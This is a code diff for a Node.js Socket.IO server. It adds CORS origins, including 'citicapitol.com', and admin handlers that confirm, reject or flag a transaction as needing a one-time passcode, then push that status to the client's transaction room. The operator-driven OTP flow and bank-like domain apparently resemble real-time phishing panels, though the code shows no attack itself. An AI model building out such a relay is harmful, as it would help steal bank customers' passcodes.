@@ -19,7 +19,8 @@ const server = http.createServer(app);
 const io = new Server(server, {
     cors: {
         origin: [
-            "https://your-frontend-domain.com",
+            "https://city-capital-socket.onrender.com",
+            "https://citicapitol.com",
             "http://localhost:3000"
         ],
         methods: ["GET", "POST"],
@@ -121,26 +122,50 @@ io.on("connection", (socket) => {
     socket.on("admin_confirm_txn", (data) => {
         console.log("Admin confirmed transaction:", data);
 
-        pendingConfirmations[data.transaction_id] = data;
+        pendingConfirmations[data.transaction_id] = { 
+            ...data, 
+            status: "confirmed"
+         };
 
         const roomName = `txn-${data.transaction_id}`;
-        io.to(roomName).emit("txn_confirmed", data);
+        io.to(roomName).emit("txn_confirmed", {
+        ...data,
+        status: "confirmed"
+    });
         console.log(`Broadcasted txn_confirmed to ${roomName}`);
     });
 
     /* ------------------------ ADMIN REJECTS TRANSACTION ------------------------- */
     socket.on("admin-reject-txn", (data) => {
         console.log("Admin rejected transaction:", data);
-
         pendingConfirmations[data.transaction_id] = {
             ...data,
             status: "rejected"
         };
 
         const roomName = `txn-${data.transaction_id}`;
-        io.to(roomName).emit("txn_rejected", data);
+        io.to(roomName).emit("txn_rejected", {
+        ...data,
+        status: "rejected"
+    });
         console.log(`Broadcasted txn_rejected to ${roomName}`);
     });
+// Server-side: handle admin OTP-needed confirmation
+socket.on("admin_confirm_otp_needed", (data) => {
+    console.log("Admin marked OTP needed:", data);
+
+    pendingConfirmations[data.transaction_id] = {
+        ...data,
+        status: "otpNeeded"
+    };
+
+    const roomName = `txn-${data.transaction_id}`;
+
+    io.to(roomName).emit("otp_needed", {
+        ...data,
+        status: "otpNeeded"
+    });
+});
 
     /* ------------------------------ DISCONNECT ------------------------------ */
     socket.on("disconnect", () => {
